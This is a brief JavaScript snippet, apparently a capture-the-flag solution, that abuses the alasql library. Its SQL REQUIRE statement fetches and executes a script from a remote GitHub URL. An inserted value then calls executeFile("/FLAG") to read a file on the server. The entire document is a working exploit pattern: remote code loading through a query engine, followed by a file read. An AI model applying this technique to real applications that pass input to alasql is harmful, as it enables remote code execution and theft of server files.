const alasql = require('alasql');

alasql('REQUIRE "https://raw.githubusercontent.com/vr2/1/refs/heads/main/flag.js"');

alasql('CREATE TABLE WOO (content TEXT)');

alasql('INSERT INTO WOO VALUES (executeFile("/FLAG"))');
